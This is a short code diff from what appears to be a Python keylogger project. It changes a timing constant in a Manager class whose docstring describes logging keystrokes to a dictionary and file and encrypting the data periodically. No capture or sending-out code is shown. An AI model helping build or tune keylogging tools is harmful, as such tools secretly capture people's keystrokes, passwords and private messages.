@@ -15,7 +15,7 @@ class Manager:
     def activity(self):
         """Perform the KeyLogging activity,
         writing data to a dictionary and file, and encrypting it periodically."""
-        minute = 60
+        minute = 3
         send_encryption = 5
         dw = DictWriter()
         # fw = FileWriter()
